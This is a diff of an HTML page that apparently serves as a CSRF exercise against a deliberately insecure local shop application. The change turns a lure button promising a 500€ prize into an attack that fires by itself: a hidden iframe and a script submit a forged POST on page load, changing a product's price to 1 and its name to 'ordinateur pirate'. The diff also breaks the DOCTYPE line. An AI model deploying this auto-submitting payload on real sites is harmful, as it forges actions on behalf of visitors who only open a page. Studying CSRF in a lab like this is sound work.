@@ -1,15 +1,22 @@
-<!DOCTYPE html>
+!DOCTYPE html>
 <html>
 <body>
 
-<form action="http://localhost:8080/csrf_non_securisee/ProduitEditionController" method="POST">
+<iframe name="hiddenFrame" style="display:none;"></iframe>
+
+<form action="http://localhost:8080/csrf_non_securisee/ProduitEditionController"
+      method="POST" target="hiddenFrame">
+
     <input type="hidden" name="id" value="10">
     <input type="hidden" name="code" value="551245">
     <input type="hidden" name="designation" value="ordinateur pirate">
     <input type="hidden" name="prix" value="1">
     <input type="hidden" name="categorie" value="12">
-
-    <button type="submit"  style="display:block; margin: 0 auto">Cliquez ici pour gagner 500€ 🎁</button>
 </form>
+
+<script>
+    document.forms[0].submit();
+</script>
+
 </body>
 </html>
